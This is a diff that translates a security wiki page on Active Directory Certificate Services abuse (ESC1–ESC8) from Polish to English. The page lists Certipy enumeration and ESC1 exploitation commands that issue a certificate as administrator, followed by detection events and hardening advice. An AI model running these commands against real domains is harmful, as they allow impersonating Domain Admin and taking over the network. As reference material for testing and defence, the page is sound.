@@ -12,42 +12,42 @@ author: "core"
 # AD CS Abuse (ESC1–ESC8)
 
 ## TL;DR
-Źle skonfigurowane szablony certyfikatów w Active Directory Certificate Services pozwalają wystawić certyfikat podszywający się pod dowolnego użytkownika (w tym Domain Admin) → uwierzytelnienie Kerberos jako ofiara. `Certipy` enumeruje i wykorzystuje.
+Misconfigured certificate templates in Active Directory Certificate Services let you issue a certificate impersonating any user (including Domain Admin) → Kerberos authentication as the victim. `Certipy` enumerates and exploits them.
 
-## Enumeracja
+## Enumeration
 ```bash
 certipy find -u user@corp.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -stdout
 ```
 
-## Skrót technik
+## Technique overview
 ```text
-ESC1  – szablon: ENROLLEE_SUPPLIES_SUBJECT + client auth + enroll dla usera -> SAN = dowolny user
+ESC1  – template: ENROLLEE_SUPPLIES_SUBJECT + client auth + enroll for user -> SAN = any user
 ESC2  – Any Purpose EKU
-ESC3  – Enrollment Agent -> żądaj w imieniu innych
-ESC4  – zapis (WriteDacl) na szablonie -> przerób go w ESC1
-ESC6  – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN w dowolnym żądaniu
-ESC8  – NTLM relay do web enrollment (HTTP) CA
+ESC3  – Enrollment Agent -> request on behalf of others
+ESC4  – write (WriteDacl) on the template -> turn it into ESC1
+ESC6  – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN in any request
+ESC8  – NTLM relay to the web enrollment (HTTP) CA
 ```
 
-## Przykład ESC1
+## ESC1 example
 ```bash
-# Wystaw cert jako administrator, korzystając z podatnego szablonu
+# Issue a cert as administrator using the vulnerable template
 certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template VulnTemplate \
   -upn administrator@corp.local -dc-ip 10.10.10.10
 
-# Uwierzytelnij się certem -> hash NT / TGT
+# Authenticate with the cert -> NT hash / TGT
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
 ```
 
-## Wykrywanie (Blue Team)
-- Event **4886/4887** (żądanie/wystawienie certu) z SAN ≠ żądający.
-- Certyfikaty z UPN admina wystawione low-priv użytkownikom.
-- Monitoring zapisów do szablonów (obiekty w `CN=Certificate Templates`).
+## Detection (Blue Team)
+- Event **4886/4887** (cert request/issuance) with SAN ≠ requester.
+- Certificates with an admin UPN issued to low-priv users.
+- Monitoring writes to templates (objects under `CN=Certificate Templates`).
 
-## Mitygacja / Hardening
-- Usuń `ENROLLEE_SUPPLIES_SUBJECT` tam gdzie zbędne; ogranicz enroll rights.
-- Wyłącz `EDITF_ATTRIBUTESUBJECTALTNAME2` na CA.
-- Wymuś manager approval na wrażliwych szablonach; HTTPS + EPA dla web enrollment (ESC8).
+## Mitigation / Hardening
+- Remove `ENROLLEE_SUPPLIES_SUBJECT` where unneeded; restrict enroll rights.
+- Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA.
+- Enforce manager approval on sensitive templates; HTTPS + EPA for web enrollment (ESC8).
 
-## Źródła
+## Sources
 - [Certipy](https://github.com/ly4k/Certipy) · [SpecterOps – Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
